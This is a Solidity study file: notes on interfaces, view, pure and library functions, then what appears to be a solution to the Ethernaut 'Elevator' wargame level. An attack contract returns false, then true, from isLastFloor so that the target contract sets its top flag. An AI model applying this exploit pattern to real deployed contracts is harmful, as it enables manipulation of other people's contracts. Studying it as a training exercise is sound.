/* 
INTERFACES
-All declared functions must be external in the interface, even if they are public in contract.
-All functions declared in interfaces are implicitly virtual and any functions that override them do not need the
override keyword.

View Functions
-Functions can be declared view in which case they promise not to modify the state.

Pure Functions
-Functions can be declared pure in which case they promise not to read from or modify the state.

Libraries
-Library functions can only be called directly (i.e. without the use of DELEGATECALL) if they do not
modify the state (i.e. if they are view or pure functions), because libraries are assumed to be stateless.

*/


//elevator.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

//elevatorAttack.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './elevator.sol';

contract ElevatorAttack{
  Elevator public target;
  bool public toggle = true;


  constructor(address _target) public{
    target = Elevator(_target);
  }
  
  function isLastFloor(uint )public returns(bool) {
    toggle = !toggle;
    return toggle;
   }
   
   function setTop(uint _floor) public {
    target.goTo(_floor);
    }
 }
  

